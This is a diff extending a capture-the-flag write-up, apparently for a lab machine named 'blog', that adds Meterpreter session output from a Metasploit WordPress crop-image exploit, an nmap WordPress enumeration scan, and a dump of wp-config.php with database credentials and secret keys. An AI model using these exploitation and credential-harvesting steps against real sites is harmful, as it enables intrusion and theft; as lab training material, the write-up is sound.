@@ -346,6 +346,10 @@ msf5 exploit(multi/http/wp_crop_rce) > exploit
 [*] Meterpreter session 1 opened (10.2.27.38:4444 -> 10.10.192.244:54102) at 2020-07-19 22:06:52 -0600
 [*] Attempting to clean up files...
 
+meterpreter > sysinfo
+Computer    : blog
+OS          : Linux blog 4.15.0-101-generic #102-Ubuntu SMP Mon May 11 10:07:26 UTC 2020 x86_64
+Meterpreter : php/linux
 meterpreter > ls
 Listing: /var/www/wordpress
 ===========================
@@ -382,4 +386,93 @@ I'm in! Lets start looking around to see how I can get some sweet sweet privileg
 ## Privilege Escalation #2
 
 
-*stay tuned...*
+I leveraged nmaps ```http-wordpress-enum``` script to give me extra information about our wordpress instance:
+
+```bash
+➜  ~ nmap -sV --script http-wordpress-enum 10.10.188.234
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-20 11:50 MDT
+Nmap scan report for blog.thm (10.10.188.234)
+Host is up (0.19s latency).
+Not shown: 996 closed ports
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+| http-wordpress-enum: 
+| Search limited to top 100 themes/plugins
+|   themes
+|     twentysixteen 2.1
+|_    twentyseventeen 2.3
+```
+
+Doing a little poking around in wp-config.php, I noticed some MySQL credentials and keys that were stored within the file:
+
+```bash
+meterpreter > cat wp-config.php
+<?php
+/**
+ * The base configuration for WordPress
+ *
+ * The wp-config.php creation script uses this file during the
+ * installation. You don't have to use the web site, you can
+ * copy this file to "wp-config.php" and fill in the values.
+ *
+ * This file contains the following configurations:
+ *
+ * * MySQL settings
+ * * Secret keys
+ * * Database table prefix
+ * * ABSPATH
+ *
+ * @link https://codex.wordpress.org/Editing_wp-config.php
+ *
+ * @package WordPress
+ */
+
+/* Custom */
+/*
+define('WP_HOME', '/');
+define('WP_SITEURL', '/'); */
+
+// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define('DB_NAME', 'blog');
+
+/** MySQL database username */
+define('DB_USER', 'wordpressuser');
+
+/** MySQL database password */
+define('DB_PASSWORD', 'LittleYellowLamp90!@');
+
+/** MySQL hostname */
+define('DB_HOST', 'localhost');
+
+/** Database Charset to use in creating database tables. */
+define('DB_CHARSET', 'utf8');
+
+/** The Database Collate type. Don't change this if in doubt. */
+define('DB_COLLATE', '');
+
+/** Custom FS Method */
+define('FS_METHOD', 'direct');
+
+/**#@+
+ * Authentication Unique Keys and Salts.
+ *
+ * Change these to different unique phrases!
+ * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
+ * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
+ *
+ * @since 2.6.0
+ */
+define('AUTH_KEY',         'ZCgJQaT0(*+Zjo}Iualapeo|?~nMtp^1IUrquYx3!#T$ihW8F~_`L+$N E>J!Bm;');
+define('SECURE_AUTH_KEY',  'nz|(+d|| yVX-5_on76q%:M, ?{NVJ,Q(;p3t|_B*]-yQ&|]3}M@Po!f_,T-S4fe');
+define('LOGGED_IN_KEY',    'a&I&DR;PUnPKul^kLBgxYa@`g||{eZf><sf8SmKBi+R7`O?](SuL&/H#hqzO$_:3');
+define('NONCE_KEY',        'Vdd-zzB:/yxg6unZvng,oY-%Z V,i%+Uz_f)S;Efz!;cY3p~]T,g1z*Z[jXe>5Sm');
+define('AUTH_SALT',        'u+k8g;=jbe)6/X~<M1HwINhH(Tno@orx:$_$-#*id)ddBYGGF(]AP?}4?2E|m;5`');
+define('SECURE_AUTH_SALT', '>Rg5>,/^BywVg^A[Etqot:CoU+9<)YPM~h|)Ifd5!iK!L*5+JDiZi33KrYZNd2B7');
+define('LOGGED_IN_SALT',   '3kpL-rcnU+>H#t/g>9<)j/u I1/-Ws;h6GrDQ>v8%7@C~`h1lBC/euttp)/8EdA_');
+define('NONCE_SALT',       'JEajZ)y?&.m-1^$(c-JX$zi0qv|7]F%7a6jh]P5SRs+%`*60?WJVk$><b$poQg9>');
+```
+
+Too bad there's no MySQL database found on this box, so no MySQL server I could log into with these creds...hmm...
